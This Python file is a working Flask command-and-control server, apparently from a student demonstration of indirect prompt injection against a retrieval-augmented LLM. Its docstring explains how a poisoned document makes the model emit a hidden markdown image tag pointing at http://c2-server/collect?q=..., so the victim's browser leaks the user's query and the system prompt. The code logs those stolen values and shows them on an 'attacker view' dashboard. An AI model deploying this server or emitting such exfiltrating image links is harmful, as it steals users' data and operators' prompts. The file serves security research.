"""
c2_server.py — Command & Control (C2) Exfiltration Server
Implemented by: Tanvin Islam Abir (2105020)

This module runs the attacker's HTTP listener that captures exfiltrated data
from the victim's browser. When the LLM injects a hidden markdown image tag
like ![](http://c2-server/collect?q=...), the victim's browser automatically
sends an HTTP GET request to this server, leaking the user's query and
session context in the URL query parameters.

The server:
  1. Listens on a configurable port (default 9999)
  2. Logs all incoming requests with timestamps
  3. Decodes URL-encoded exfiltrated data
  4. Serves a 1x1 transparent pixel GIF as the "image" response
  5. Provides a dashboard to view captured data
"""

import os
import json
import urllib.parse
from datetime import datetime
from flask import Flask, request, send_file, jsonify, render_template_string
import io
import struct


# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
C2_PORT = 9999
C2_HOST = "0.0.0.0"
LOG_FILE = os.path.join(os.path.dirname(__file__), "c2_exfil_log.json")

# 1x1 transparent GIF (43 bytes) — served as the "image" response
# This is the standard minimal GIF89a used for tracking pixels.
TRANSPARENT_GIF = (
    b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff'
    b'\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00\x00\x2c\x00\x00\x00\x00'
    b'\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'
)


# ---------------------------------------------------------------------------
# Exfiltration log storage
# ---------------------------------------------------------------------------
class ExfilLog:
    """Thread-safe log of exfiltrated data."""

    def __init__(self, log_file: str = LOG_FILE):
        self.log_file = log_file
        self.entries = []
        self._load()

    def _load(self):
        """Load existing log entries from disk."""
        if os.path.exists(self.log_file):
            try:
                with open(self.log_file, "r") as f:
                    self.entries = json.load(f)
            except (json.JSONDecodeError, IOError):
                self.entries = []

    def _save(self):
        """Persist log entries to disk."""
        with open(self.log_file, "w") as f:
            json.dump(self.entries, f, indent=2)

    def add(self, entry: dict):
        """Add a new exfiltration entry."""
        self.entries.append(entry)
        self._save()

    def get_all(self) -> list:
        """Return all log entries."""
        return self.entries

    def clear(self):
        """Clear all log entries."""
        self.entries = []
        self._save()


# ---------------------------------------------------------------------------
# Flask C2 Application
# ---------------------------------------------------------------------------
exfil_log = ExfilLog()
app = Flask(__name__)


# Dashboard HTML template
DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>C2 Exfiltration Dashboard — Attacker View</title>
<meta http-equiv="refresh" content="5">
<style>
  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Inter:wght@400;600&display=swap');
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: 'Inter', sans-serif; background: #0d1117; color: #c9d1d9; padding: 30px; }
  h1 { color: #f85149; font-size: 1.6rem; margin-bottom: 8px; }
  .subtitle { color: #8b949e; margin-bottom: 24px; font-size: 0.9rem; }
  .stats { display: flex; gap: 16px; margin-bottom: 24px; }
  .stat-card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 16px 20px; min-width: 150px; }
  .stat-card .label { font-size: 0.75rem; color: #8b949e; text-transform: uppercase; letter-spacing: 0.05em; }
  .stat-card .value { font-size: 1.8rem; font-weight: 600; color: #f85149; margin-top: 4px; }
  table { width: 100%; border-collapse: collapse; background: #161b22; border-radius: 8px; overflow: hidden; }
  th { background: #21262d; color: #f85149; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.05em; padding: 12px 16px; text-align: left; }
  td { padding: 10px 16px; border-top: 1px solid #21262d; font-size: 0.88rem; vertical-align: top; }
  tr:hover td { background: #1c2128; }
  .mono { font-family: 'JetBrains Mono', monospace; font-size: 0.82rem; }
  .tag { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 0.72rem; font-weight: 600; }
  .tag-exfil { background: #f8514922; color: #f85149; }
  .empty { text-align: center; color: #484f58; padding: 40px; font-style: italic; }
</style>
</head>
<body>
<h1>☠ C2 Exfiltration Dashboard</h1>
<p class="subtitle">Attacker's view — captured data from indirect prompt injection via RAG</p>
<div class="stats">
  <div class="stat-card">
    <div class="label">Total Captures</div>
    <div class="value">{{ entries|length }}</div>
  </div>
  <div class="stat-card">
    <div class="label">Unique Queries</div>
    <div class="value">{{ unique_queries }}</div>
  </div>
</div>
{% if entries %}
<table>
  <thead>
    <tr>
      <th>#</th>
      <th>Timestamp</th>
      <th>Exfiltrated Query</th>
      <th>System Prompt Leak</th>
      <th>Source IP</th>
      <th>User-Agent</th>
    </tr>
  </thead>
  <tbody>
  {% for e in entries|reverse %}
    <tr>
      <td>{{ loop.revindex }}</td>
      <td class="mono">{{ e.timestamp }}</td>
      <td><span class="tag tag-exfil">STOLEN</span> {{ e.query }}</td>
      <td class="mono">{{ e.system_prompt or '—' }}</td>
      <td class="mono">{{ e.source_ip }}</td>
      <td style="max-width:200px; overflow:hidden; text-overflow:ellipsis;">{{ e.user_agent }}</td>
    </tr>
  {% endfor %}
  </tbody>
</table>
{% else %}
<div class="empty">No exfiltrated data yet. Waiting for victims to query the poisoned RAG system...</div>
{% endif %}
</body>
</html>
"""


@app.route("/collect")
def collect():
    """
    Exfiltration endpoint. Receives stolen data as URL query parameters,
    logs it, and returns a 1x1 transparent GIF.
    """
    # Extract exfiltrated data from query parameters
    query_param   = request.args.get("q", "")
    sys_param     = request.args.get("sys", "")
    ctx_param     = request.args.get("ctx", "")

    # Decode URL-encoded values
    stolen_query  = urllib.parse.unquote_plus(query_param)
    stolen_sys    = urllib.parse.unquote_plus(sys_param)
    stolen_ctx    = urllib.parse.unquote_plus(ctx_param)

    entry = {
        "timestamp":     datetime.now().isoformat(),
        "query":         stolen_query,
        "system_prompt": stolen_sys,
        "context":       stolen_ctx,
        "source_ip":     request.remote_addr,
        "user_agent":    request.headers.get("User-Agent", ""),
        "full_url":      request.url,
        "raw_params":    dict(request.args),
    }

    exfil_log.add(entry)

    # Print to attacker's console
    print(f"\n{'='*60}")
    print(f"[C2] *** EXFILTRATED DATA RECEIVED ***")
    print(f"[C2] Timestamp:    {entry['timestamp']}")
    print(f"[C2] Stolen Query: {stolen_query}")
    if stolen_sys:
        print(f"[C2] System Prompt: {stolen_sys}")
    if stolen_ctx:
        print(f"[C2] Context:      {stolen_ctx}")
    print(f"[C2] Source IP:    {entry['source_ip']}")
    print(f"{'='*60}\n")

    # Return 1x1 transparent GIF
    return (
        TRANSPARENT_GIF,
        200,
        {
            "Content-Type": "image/gif",
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Access-Control-Allow-Origin": "*",
        }
    )


@app.route("/")
def dashboard():
    """Render the C2 dashboard showing all exfiltrated data."""
    entries = exfil_log.get_all()
    unique_queries = len(set(e.get("query", "") for e in entries))
    return render_template_string(
        DASHBOARD_HTML,
        entries=entries,
        unique_queries=unique_queries,
    )


@app.route("/api/log")
def api_log():
    """JSON API endpoint to retrieve all exfiltration logs."""
    return jsonify(exfil_log.get_all())


@app.route("/api/clear", methods=["POST"])
def api_clear():
    """Clear all exfiltration logs."""
    exfil_log.clear()
    return jsonify({"status": "cleared"})


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    print(f"[C2] Starting C2 exfiltration server on http://{C2_HOST}:{C2_PORT}")
    print(f"[C2] Dashboard: http://localhost:{C2_PORT}/")
    print(f"[C2] Exfil endpoint: http://localhost:{C2_PORT}/collect?q=<data>")
    print(f"[C2] Log file: {LOG_FILE}")
    print(f"[C2] Waiting for exfiltrated data...\n")
    app.run(host=C2_HOST, port=C2_PORT, debug=False)
